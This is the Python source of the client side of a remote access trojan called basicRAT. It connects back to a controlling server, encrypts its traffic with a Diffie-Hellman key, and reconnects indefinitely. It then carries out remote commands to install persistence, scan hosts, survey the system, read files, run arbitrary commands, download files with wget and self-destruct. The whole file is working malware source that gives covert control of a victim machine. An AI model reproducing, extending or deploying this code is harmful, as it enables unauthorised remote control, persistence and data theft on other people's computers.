#!/usr/bin/env python

#
# RAT client
# https://github.com/harshivara/basicRAT
#

import argparse
import socket
import sys
import time

from core import crypto, persistence, scan, survey, toolkit


# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def client_loop(conn, dhkey):
    while True:
        results = ''

        # wait to receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT client')
    parser.add_argument('-i', '--ip', help='Server IP.',
                        default='127.0.0.1', type=str)
    parser.add_argument('-p', '--port', help='Port to connect on.',
                        default=1337, type=int)
    parser.add_argument('-t', '--timeout', help='timeout',
                        default=30, type=int)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    host = args['ip']
    port = args['port']
    timeout = args['timeout']

    exit_status = 0

    while True:
        conn = socket.socket()

        try:
            # attempt to connect to RAT server
            conn.connect((host, port))
        except socket.error:
            time.sleep(timeout)
            continue

        dhkey = crypto.diffiehellman(conn)

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn, dhkey)
        except: pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
